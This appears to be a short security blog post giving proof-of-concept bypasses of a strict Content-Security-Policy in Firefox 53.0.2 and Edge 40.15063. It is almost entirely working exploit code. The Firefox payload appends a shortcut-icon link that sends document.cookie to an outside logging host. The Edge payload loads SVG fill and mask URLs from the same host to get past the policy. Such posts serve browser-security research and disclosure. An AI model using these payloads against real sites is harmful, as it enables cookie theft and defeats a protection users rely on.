---
layout: post
title: Firefox53 &amp; Edge40 Browsers CSP Bypass 
---
#### Firefox 53.0.2 Version

- PoC: [http://server.n0tr00t.com/firefox/ffcsp53.0.2.php](http://server.n0tr00t.com/firefox/ffcsp53.0.2.php)
- PiC: [https://ws1.sinaimg.cn/large/c334041bgy1ffeb2a6xfej20ph09nacs.jpg](https://ws1.sinaimg.cn/large/c334041bgy1ffeb2a6xfej20ph09nacs.jpg)
	
CSP RULE:

    header("Content-Security-Policy: default-src 'none' 'unsafe-inline';");

Bypass:

	x = (new Date()).valueOf();
	document.cookie = "csp=" + escape("SECUREKEY@^#2!@#") + ";";
		
	ffn0t= document.head.appendChild(document.createElement("link"));
	ffn0t.rel = "shortcut icon";
	ffn0t.href = "http://" + x + ".shortcuticon.ff.vqn3j8.ceye.io/?" + document.cookie;

#### Microsoft Edge 40.15063 Version

- PoC: [http://server.n0tr00t.com/test/edge3.php](http://server.n0tr00t.com/test/edge3.php)
- PiC: [https://ws1.sinaimg.cn/large/c334041bgy1ffexx3u68oj20kq08rgma.jpg](https://ws1.sinaimg.cn/large/c334041bgy1ffexx3u68oj20kq08rgma.jpg)

CSP RULE:

	header("Content-Security-Policy: default-src 'none' 'unsafe-inline';");

Bypass:

    <script>
    (function(){
        var x = document.body.appendChild(document.createElement("svg"));
        x.setAttribute("id", "n0tr00t");
        x.setAttribute("xmlns", "http://www.w3.org/2000/svg");

        /* fill & mask */
        var svgNS = "http://www.w3.org/2000/svg";
        var n0tr00t = document.getElementById('n0tr00t');
        var fillurl = "url(http://csp32test2.edge.vqn3j8.ceye.io/fillbypass)";
        var maskurl = "url(http://csp32test2.edge.vqn3j8.ceye.io/maskbypass)";
        var nodeRect = n0tr00t.appendChild(document.createElementNS(svgNS, "rect"));
        nodeRect.setAttribute("height", 200);
        nodeRect.setAttribute("width", 200);
        nodeRect.setAttribute("fill", fillurl);
        nodeRect.setAttribute("stroke","#000000");
        var nodeRect2 = n0tr00t.appendChild(document.createElementNS(svgNS, "rect"));
        nodeRect2.setAttribute("height", 200);
        nodeRect2.setAttribute("width", 200);
        nodeRect2.setAttribute("fill", "green");
        nodeRect2.setAttribute("mask", maskurl);
        nodeRect2.setAttribute("stroke","#000000");
    })()
    </script>